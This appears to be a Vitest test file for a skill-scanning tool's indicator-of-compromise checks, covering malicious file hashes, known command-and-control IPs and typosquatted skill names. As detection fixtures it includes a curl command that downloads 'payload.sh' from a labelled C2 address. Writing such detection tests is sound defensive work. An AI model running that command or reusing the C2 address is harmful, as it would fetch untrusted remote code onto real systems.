import { describe, it, expect, beforeEach } from 'vitest';
import { createHash } from 'node:crypto';
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { iocChecks } from '../../src/checks/ioc.js';
import { parseSkillContent } from '../../src/parser.js';
import { resetIOCCache } from '../../src/ioc/index.js';
import { scanSkillDirectory } from '../../src/scanner.js';
import { levenshtein } from '../../src/utils/levenshtein.js';
import { matchTyposquat, matchC2IPs, matchMaliciousHashes } from '../../src/ioc/matcher.js';
import { DEFAULT_IOC } from '../../src/ioc/indicators.js';
import type { ParsedSkill } from '../../src/types.js';

function makeSkill(body: string, name = 'test-skill') {
  return parseSkillContent(
    `---\nname: ${name}\ndescription: test\n---\n${body}`
  );
}

beforeEach(() => {
  resetIOCCache();
});

describe('Levenshtein distance', () => {
  it('returns 0 for identical strings', () => {
    expect(levenshtein('abc', 'abc')).toBe(0);
  });

  it('returns length for empty vs non-empty', () => {
    expect(levenshtein('', 'abc')).toBe(3);
    expect(levenshtein('abc', '')).toBe(3);
  });

  it('computes single edit distance', () => {
    expect(levenshtein('clawhub', 'clawhub1')).toBe(1);
    expect(levenshtein('clawhub', 'cllawhub')).toBe(1);
    expect(levenshtein('clawhub', 'clawhab')).toBe(1);
  });

  it('computes distance 2', () => {
    expect(levenshtein('clawhub', 'clawhubb')).toBe(1);
    expect(levenshtein('claude', 'cluade')).toBe(2);
  });

  it('returns large distance for unrelated strings', () => {
    expect(levenshtein('abc', 'xyz')).toBe(3);
  });
});

describe('SUPPLY-008: Malicious hash detection', () => {
  const TMP_DIR = join(import.meta.dirname, '..', 'tmp-ioc-hash-test');

  it('detects file matching known malicious hash', () => {
    // Create temp dir with a file whose hash we control
    rmSync(TMP_DIR, { recursive: true, force: true });
    mkdirSync(TMP_DIR, { recursive: true });

    const payload = 'malicious-payload-content-for-test';
    const payloadHash = createHash('sha256').update(payload).digest('hex');
    writeFileSync(join(TMP_DIR, 'evil.js'), payload);

    // Build a custom IOC with our known hash
    const customIOC = {
      ...DEFAULT_IOC,
      malicious_hashes: { [payloadHash]: 'test-malware' },
    };

    // Build a minimal ParsedSkill pointing at the temp dir
    const skill: ParsedSkill = {
      ...makeSkill('# Test'),
      dirPath: TMP_DIR,
      files: [{ path: 'evil.js', content: payload }],
    };

    const matches = matchMaliciousHashes(skill, customIOC);
    expect(matches.length).toBe(1);
    expect(matches[0].file).toBe('evil.js');
    expect(matches[0].description).toBe('test-malware');

    rmSync(TMP_DIR, { recursive: true, force: true });
  });

  it('SUPPLY-008 rule fires via ioc-override + scanSkillDirectory', () => {
    // Setup: temp skill dir with a malicious file
    rmSync(TMP_DIR, { recursive: true, force: true });
    mkdirSync(TMP_DIR, { recursive: true });

    const payload = 'malicious-payload-content-for-test';
    const payloadHash = createHash('sha256').update(payload).digest('hex');
    writeFileSync(join(TMP_DIR, 'evil.js'), payload);
    writeFileSync(
      join(TMP_DIR, 'SKILL.md'),
      '---\nname: test\ndescription: test\n---\n# Test skill with enough body content to pass structural checks.'
    );

    // Use fake HOME to avoid polluting real user directory
    const fakeHome = join(TMP_DIR, 'fakehome');
    const overrideDir = join(fakeHome, '.config', 'skill-checker');
    mkdirSync(overrideDir, { recursive: true });
    writeFileSync(
      join(overrideDir, 'ioc-override.json'),
      JSON.stringify({ malicious_hashes: { [payloadHash]: 'test-malware' } })
    );

    const oldHome = process.env.HOME;
    process.env.HOME = fakeHome;
    resetIOCCache();

    try {
      const report = scanSkillDirectory(TMP_DIR);
      const finding = report.results.find((r) => r.id === 'SUPPLY-008');
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe('CRITICAL');
    } finally {
      process.env.HOME = oldHome;
      resetIOCCache();
      rmSync(TMP_DIR, { recursive: true, force: true });
    }
  });

  it('does not flag clean skill content', () => {
    const skill = makeSkill('# Safe Skill\n\nThis is a safe skill.');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-008')).toBe(false);
  });
});

describe('SUPPLY-009: C2 IP detection', () => {
  it('detects known C2 IP in content', () => {
    const skill = makeSkill(
      'Connect to server at 91.92.242.30 for updates.'
    );
    const results = iocChecks.run(skill);
    const c2Results = results.filter((r) => r.id === 'SUPPLY-009');
    expect(c2Results.length).toBeGreaterThan(0);
    expect(c2Results[0].severity).toBe('CRITICAL');
  });

  it('does not flag private IPs', () => {
    const skill = makeSkill('Server at 192.168.1.1 and 10.0.0.1 and 127.0.0.1');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-009')).toBe(false);
  });

  it('does not flag unknown public IPs', () => {
    const skill = makeSkill('Server at 8.8.8.8 for DNS.');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-009')).toBe(false);
  });

  it('detects C2 IP in URL context', () => {
    const skill = makeSkill('curl http://91.92.242.30/payload.sh');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-009')).toBe(true);
  });

  it('matchC2IPs excludes private ranges', () => {
    const skill = makeSkill('10.0.0.1 172.16.0.1 192.168.0.1 169.254.1.1');
    const matches = matchC2IPs(skill, DEFAULT_IOC);
    expect(matches.length).toBe(0);
  });
});

describe('SUPPLY-010: Typosquat detection', () => {
  it('detects known typosquat pattern (CRITICAL)', () => {
    const skill = makeSkill('# Fake skill', 'clawhub1');
    const results = iocChecks.run(skill);
    const typoResults = results.filter((r) => r.id === 'SUPPLY-010');
    expect(typoResults.length).toBe(1);
    expect(typoResults[0].severity).toBe('CRITICAL');
  });

  it('detects similar name via edit distance (HIGH)', () => {
    const skill = makeSkill('# Fake skill', 'clawhubb');
    const results = iocChecks.run(skill);
    const typoResults = results.filter((r) => r.id === 'SUPPLY-010');
    expect(typoResults.length).toBe(1);
    expect(typoResults[0].severity).toBe('HIGH');
  });

  it('does not flag exact protected name', () => {
    const skill = makeSkill('# Real skill', 'clawhub');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-010')).toBe(false);
  });

  it('does not flag unrelated name', () => {
    const skill = makeSkill('# My tool', 'my-awesome-tool');
    const results = iocChecks.run(skill);
    expect(results.some((r) => r.id === 'SUPPLY-010')).toBe(false);
  });

  it('matchTyposquat returns null for legitimate names', () => {
    expect(matchTyposquat('clawhub', DEFAULT_IOC)).toBeNull();
    expect(matchTyposquat('my-unique-skill', DEFAULT_IOC)).toBeNull();
  });

  it('matchTyposquat detects known pattern', () => {
    const result = matchTyposquat('clawhub1', DEFAULT_IOC);
    expect(result).not.toBeNull();
    expect(result!.type).toBe('known');
  });

  it('matchTyposquat detects edit distance match', () => {
    const result = matchTyposquat('cluade', DEFAULT_IOC);
    expect(result).not.toBeNull();
    expect(result!.type).toBe('similar');
    expect(result!.distance).toBeLessThanOrEqual(2);
  });
});

describe('IOC integration', () => {
  it('clean skill produces no IOC findings', () => {
    const skill = makeSkill(
      '# My Skill\n\nThis skill processes local files safely.'
    );
    const results = iocChecks.run(skill);
    expect(results.length).toBe(0);
  });

  it('multiple IOC findings in one skill', () => {
    const skill = makeSkill(
      'Connect to 91.92.242.30 for C2.\nAlso try 185.220.101.1.',
      'clawhub1'
    );
    const results = iocChecks.run(skill);
    expect(results.filter((r) => r.id === 'SUPPLY-009').length).toBe(2);
    expect(results.filter((r) => r.id === 'SUPPLY-010').length).toBe(1);
  });
});

describe('Regression: empty file hash false positive', () => {
  it('seed data does not contain empty file SHA-256', () => {
    const emptyHash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
    expect(DEFAULT_IOC.malicious_hashes[emptyHash]).toBeUndefined();
  });

  it('SHA-256 of empty content matches known empty hash', () => {
    const hash = createHash('sha256').update('').digest('hex');
    expect(hash).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  });
});
